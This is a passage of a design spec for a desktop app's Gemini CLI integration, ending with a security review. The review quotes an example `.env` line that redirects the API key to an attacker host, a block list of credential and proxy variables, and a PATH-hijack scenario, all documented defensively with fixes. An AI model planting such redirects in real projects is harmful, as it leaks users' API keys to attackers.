The picker group is "Gemini (API, pay-as-you-go)" with a muted line "Billed per use on your Google AI Studio account". It lists
the models the session reported, without `auto` (it can pick the Pro model by itself). A new task starts on the cheapest
model the session lists: `flash-lite` first, then `flash`, then the rest, in the CLI's order within a tier, and Guild
applies it with `session/set_model` before the first prompt of every process (new or loaded), because the CLI starts on `auto`
and returns to it after a load. A model the session does not list refuses the prompt (`model_selection_failed`). The four
modes are shown with Guild's own words: Default (asks before edits and commands), Auto-edit (edits without asking), Plan
(read-only), Full access (YOLO, asks nothing; marked as a warning like Codex's full access); the setting default is `default`.

### 8.6 Session restore
The load answer does not end the replay (section 7, gotcha 11), so the replay barrier stays open after the answer until no
`session/update` of the session has arrived for 400 ms, and for at most 15 s; a history still streaming then fails the load as a
start that got no answer in time, which keeps the session for the next try. A normal load costs those 400 ms. A frame Guild cannot
decode (a replayed tool call names its file relative to the workspace) is dropped and counted, which is harmless to the check.
Because the replay is not faithful (section 7), the replay check of a Gemini task requires that the loaded session replays
exactly the user prompts of the task's completed turns, in order, by the same digest as for the other engines; it does not
compare titles, thoughts, tool snapshots or assistant text. A prompt sent with attached files cannot be proven and is
treated as a conflict, as for Grok.

### 8.7 Browser pane, OpenViking, steer
The browser MCP server is handed to `session/new` and `session/load` as an HTTP server (the CLI advertises `http`). There is no
steering request; Steer falls back to an ordinary queued message. Branch copies the local transcript into a new session; rewind
is files only.

### 8.8 Reduced states (PC-FALLBACK-001)
Not installed (`gemini` package missing, an unsupported version): "Not installed. Run `npm install -g @google/gemini-cli`".
No usable key (no binding, unconfirmed binding, missing file or variable, an invalid key at the first prompt): the Settings
status says which and the task offers the way to Settings; Guild runs no command and shows no key. Changed files: the integrity
text naming the Gemini CLI. Stop ends the turn; a shell command the CLI already started may keep running until the task's
process closes, as for Codex.

### 8.9 Interface
The sidebar engine badge is "Ge" in the Gemini colour (a letter pair, distinct from the single letters G, C, X). The Settings >
Engines section shows the status, the key file and variable with the Confirm control, the default model (no effort) and the four
modes.

### 8.10 Schema 21 additions (3.1 is unreleased, so no migration 22)
`engine_defaults.permission_mode` accepts upper-case letters (Gemini's `autoEdit`); `engine_key_bindings(engine, key_file,
key_variable, confirmed_host, revision, updated_at_ms)` holds the binding of section 8.2; `app_settings.dock_icon` holds the
Dock choice of section 9. The `gemini` engine value and Gemini model ids already fit the identifier shapes of the foundation.

## 9. App icon and Dock choice

The owner approved new artwork, hand drawn as vector by Claude on 2026-10-13: the square "G" in a dark (the owner's "I") and a light
(the owner's "H") variant. `apps/desktop/build/icon.icns` and `icon.png` are the dark variant (the default); the sources are
`icon-dark.svg` and `icon-light.svg` next to them. Both 1024 px PNGs ship as packaged resources, `Contents/Resources/icon.png` (dark)
and `Contents/Resources/icon-light.png` (light), because Electron's `nativeImage` cannot read the bundle's `icon.icns` (it loads
as an empty image) and `app.dock.setIcon(null)` is not supported, so neither choice can fall back to the bundle icon. Settings >
General > "Dock icon" (Dark / Light, default Dark, with small previews) persists in `app_settings.dock_icon`. The main process
applies it with `app.dock.setIcon(<PNG>)` at startup (only when it is not Dark, which the bundle icon already is) and immediately
on change; a missing or empty file leaves the icon as it was and logs one fixed word, never a path. The packaged-app verification
checks that the packaged `icon.icns` equals `build/icon.icns` and that both PNGs are present, 1024 px square and byte-equal to their
sources. Previews in the Settings row are 128 px renders of the same artwork (`packages/ui/src/assets/dock-icon-*.png`).

## 10. Acceptance (installed app)
1. A fresh Gemini task: the "Gemini (API, pay-as-you-go)" group lists the session's models without `auto`, the cheapest Flash(-Lite)
   model is selected, one turn runs a tool behind a permission card approved in the UI, the footer names the model.
2. Quit and reopen Guild; the task continues through `session/load` with the same model and permission mode.
3. The sidebar shows the "Ge" badge; Settings > Engines shows the Gemini section and its key binding.
4. Settings > General: Dock icon Light / Dark takes effect at once and survives a restart.

Automated as checks J and K of `scripts/run-guild3-qa.mjs`. Check J runs only when `GUILD_QA_GEMINI_CLI=<package directory of
a @google/gemini-cli install>` is set (handed to the unpackaged app as the dev-only `GUILD_DEV_GEMINI_CLI`; a packaged app ignores
it and the locator pins whatever it finds there like any other install) and the key file holds `GEMINI_API_KEY`. The key binding is
seeded through the store the way the model sources are (`confirmEngineKeyBinding`, which stands in for the native dialog for QA
only). Check K needs no engine.

Check J asserts: the engine reports ready with the CLI's version and a confirmed, usable key bound to
`generativelanguage.googleapis.com` (a projection with no key field), the model list has no `auto` and no effort, the new task
already sits on the cheapest Flash(-Lite) model, the picker's Gemini group says pay-as-you-go and carries the cost hint, one turn
writes a file behind a permission card approved in the UI (Allow, not Allow for this session), no mode narration or replayed
context reaches the conversation, the footer and the stored label name the model, the child is `node <bundle>/gemini.js --acp
--skip-trust` with HOME and `GEMINI_CLI_HOME` under Guild's own home, the key present (presence only), `GEMINI_CLI_NO_RELAUNCH=1`,
`NODE_USE_ENV_PROXY=1`, no value in any of the OAuth, Vertex, base-URL, Google key or other engine variables (each of them
present with its neutral value, so that no `.env` can supply it), `NO_BROWSER=true`, the settings file Guild wrote
(API-key sign-in, statistics and updates off, and after a restart the task's model) and no OAuth file in that home, the account card
says Gemini API and defers to Google AI Studio for billing, the Gemini section of Settings has no key input, and after a Guild
restart the same session continues through a committed `session/load` on the stored model and mode. Check K asserts the default is
Dark, both choices are previewed and named, Light is saved at once, reported as applied by the main process (`dock_icon_applied` in
the runtime diagnostics; the Dock itself cannot be read over CDP), kept across a restart and applied again at startup, and Dark
again afterwards. The Gemini home the run created is removed with its chat files after the secret scan.

## 11. What the owner installs
`npm install -g @google/gemini-cli` (0.63 up to 0.69; Node >= 20 on PATH, Guild uses its own pinned node). A Gemini API key from
Google AI Studio in `~/.config/guild/keys.env` as `GEMINI_API_KEY` (or any file and variable), then Settings > Engines >
Gemini > Confirm.

## 12. Security review of 2026-10-13: three P1 findings [spike]
A review of the first Gemini build found three ways the guarantee of section 8 ("the key goes to Google's API only, the
sign-in is the API key, Guild runs only programs it chose") could be bypassed. Each was checked against the code and the
`@google/gemini-cli` 0.63.0 bundle before it was fixed; the proofs are `apps/desktop/src/main/gemini-security-live.test.ts`
(against a real install, run with `GUILD_QA_GEMINI_CLI`; no real key, nothing leaves the machine) and the unit tests named
below. Decision D-068. Run the live proofs with `GUILD_QA_GEMINI_CLI=<package directory of the install> node --test
apps/desktop/dist/main/gemini-security-live.test.js` (about two minutes; skipped without the variable, so `npm test` skips them).

### 12.1 A workspace `.env` could redirect the key (finding 1)
**Verified in the bundle.** `loadEnvironment` (`chunk-*.js`, `packages/cli/src/config/settings.ts`) reads *one* file, the first
that exists from the folder upward (`.gemini/.env` before `.env` in each folder when the folder is trusted, which
`--skip-trust` makes it; the home's `.gemini/.env` then `.env` at the top), parses it with `dotenv.parse`, and copies each
variable into `process.env` **only if `Object.hasOwn(process.env, key)` is false**. It runs whenever the settings are loaded: at
start for the process folder (before `--skip-trust` takes effect, so only the four sign-in variables an untrusted folder may set
get through), in the CLI's sign-in validation and in `session/new` for the session folder (both trusted, everything gets
through). The reproduction below shows the redirect working in a normal start. The `dotenv` line grammar is
`^\s*(?:export\s+)?([\w.-]+)(?:\s*=\s*?|:\s+?)(value)`: the separator may be `=` **or `:` followed by a space**, and a quoted value may
span lines. The first version of the check only matched `=`, so `GOOGLE_GEMINI_BASE_URL: https://attacker.example` in a project
`.env` passed it. **Reproduced**: with the environment Guild built before the fix, the CLI sent the request, with the
`x-goog-api-key` header, to a local stand-in for the attacker's host (`GOOGLE_GEMINI_BASE_URL` is used as the base URL whatever
the sign-in method; `getAuthTypeFromEnv` also flips to `gateway` on it).

Fix, two layers:
1. **The environment holds every variable that matters** (`GEMINI_NEUTRAL_ENVIRONMENT`, environment policy `macos-posix-gemini-v2`).
   Because the CLI keeps a variable the environment already has, a file cannot supply these. Each value was chosen by reading
   how the bundle tests the variable: an empty string is false for `GOOGLE_GEMINI_BASE_URL`, `GOOGLE_VERTEX_BASE_URL`,
   `GOOGLE_GENAI_USE_GCA`, `GOOGLE_GENAI_USE_VERTEXAI`, `GOOGLE_API_KEY`, `GOOGLE_APPLICATION_CREDENTIALS`,
   `GOOGLE_CLOUD_ACCESS_TOKEN`, `GOOGLE_CLOUD_PROJECT(_ID)`, `GOOGLE_CLOUD_LOCATION`, `CLOUD_SHELL`,
   `GEMINI_CLI_USE_COMPUTE_ADC` and `GEMINI_CLI_AUTH_OVERRIDE`; two are tested for absence and carry their default instead
   (`GOOGLE_CLOUD_UNIVERSE_DOMAIN=googleapis.com`, `NODE_TLS_REJECT_UNAUTHORIZED=1`; an empty universe domain would rewrite
   every Google host to an empty one); `CODE_ASSIST_ENDPOINT=http://127.0.0.1:9` (a closed local port: Code Assist is never
   used, so a request that slipped through meets a refused connection, not a Google host); `NO_BROWSER=true`. A built
   environment that carries any other `GEMINI_`/`GOOGLE_` variable, or one of these with another value, is refused.
   `GEMINI_API_KEY` and `GEMINI_CLI_HOME` are always in the environment, so a project `GEMINI_API_KEY` is inert (proved: the
   stand-in sees Guild's key, never the file's).
2. **The file check reads the way the CLI reads.** `parseEnvFileNames` is the `dotenv` grammar itself (checked name for name against
   the bundle's own `loadEnvironment` on a corpus of hand-written and 400 random files in the live test (about a thousand names, identical sets), which fails if the regular
   expression is changed), and `selectGeminiEnvFiles` is `findEnvFile`: the union over the four ways the CLI can be started
   (trusted or not, and `advanced.ignoreLocalEnv`, which the folder's own settings can switch on), for the folder and its real
   path, with the Guild-owned `GEMINI_CLI_HOME` as the CLI's home. Only the files the CLI could load are read, so a parent
   folder's unrelated `.env` does not stop a start. A directory or a pipe named `.env` is skipped (the CLI reads nothing from
   it), and a file over 1 MiB, or with a run of more than 512 whitespace characters, is **refused**, not skipped: padding must not hide a line, and the
   grammar's leading `\s*` is quadratic on a long run (64 KiB of blank lines took 5 s to parse, 256 KiB 40 s, which would freeze the main process).
   The refused names are `GEMINI_CLI_*`, `GEMINI_TELEMETRY_*`, `GEMINI_SANDBOX*`, `GOOGLE_GENAI_*`, `OTEL_*` and the exact names of
   `GEMINI_FORBIDDEN_ENV_FILE_VARIABLES` (base URLs, sign-in switches, Google credentials and tokens, the Code Assist endpoint,
   proxies, certificate and `NODE_OPTIONS` variables, sandbox and telemetry variables), case-insensitively. They were taken from
   the 243 distinct `process.env` variables the bundle reads. Not refused, on purpose: `GEMINI_API_KEY`, `GOOGLE_CLOUD_PROJECT`,
   `GOOGLE_CLOUD_LOCATION` (inert as above, and common in projects of their own), `GEMINI_MODEL`, `NODE_ENV` and the like.
   The older text of 8.1, which listed `GEMINI_API_KEY` among the refused names, did not match the code or its tests and is
   corrected here.

### 12.2 A workspace `.gemini/settings.json` could change the sign-in method (finding 2)
**Verified in the bundle.** The settings merge is schema defaults, system defaults, user, **workspace**, system; the workspace
file is `<folder>/.gemini/settings.json` only. `--skip-trust` sets `GEMINI_CLI_TRUST_WORKSPACE`, which makes the folder
trusted and its settings part of the merge. `session/new` takes `loadedSettings.merged.security.auth.selectedType` (the
workspace value wins over Guild's user value) and signs in with it. The two mechanisms that could pin the method do not work for
Guild: the system file is read only if root owns it and every directory above it (`isFileAndDirectorySecureSync`; a file in the
user's own home is skipped with a warning, proved: a system file with `selectedType` and `enforcedType` set to the API key did not
stop the folder's sign-in method), and `security.auth.enforcedType` is consulted by the interactive and the
non-interactive modes but not by the ACP mode. **Reproduced**: a folder `settings.json` with
`security.auth.selectedType: "oauth-personal"` made `session/new` start the Google sign-in (it waits for a person with
`NO_BROWSER=true`; no request to the API is made). It only takes effect once the CLI's 10 s settings cache has expired
(the cache of the start's load, which was made before `--skip-trust` took effect, serves a `session/new` that comes quickly),
so a quick run hides it and a slow start does not.

Fix: nothing Guild can write makes the API-key sign-in unoverridable, so `gemini-workspace-guard.ts` reads the folder's own
settings file, with the CLI's JSON-with-comments reading, and refuses the start, naming the file and the setting, when it sets
`security.auth` (any key: `selectedType`, `enforcedType`, `useExternal`), an endpoint that would receive the conversation
(`telemetry.otlpEndpoint`, `otlpProtocol`, `target`, `useCollector`, `outfile`, `experimental.gemmaModelRouter`), and falls back to the key
names when the file does not parse. A file over 1 MiB is refused. In depth, the environment carries `NO_BROWSER=true` and a closed
`CODE_ASSIST_ENDPOINT`, so a sign-in that slipped through would open no browser and reach no Google sign-in or Code Assist host
(proved: with the check bypassed, the proxy saw no `accounts.google.com`, `oauth2.googleapis.com` or `cloudcode-pa.googleapis.com`). Files changed by the CLI's own tools during a session take effect at the next start, where they are checked again.

### 12.3 `node` came from the PATH (finding 3)
**Verified in the code.** The locator searched `[PATH..., ~/.local/bin, /opt/homebrew/bin, ...]`, hashed the first `node` found and
ran `node --version` on it, then pinned that hash (trust on first use). An app started with a malicious `PATH` prefix would
have run the attacker's file and then given it the API key. The adapter, the Gemini CLI package and `claude` had the same
exposure. Fix (all engines): a packaged app never reads `PATH`; it searches fixed directories and only uses a file whose
real path is trusted (`trusted-location.ts`); see `docs/20` 3.2 for the rules and D-068. Trust on first use and the per-launch
pin are unchanged: the file is hashed before anything runs it. The unpackaged development run keeps the old behaviour.
Tests: `trusted-location.test.ts` and the "a packaged app takes nothing from the PATH it was started with" suites of the
Claude, Codex and Gemini locators, including that a PATH-prepended fake `node` is never executed.

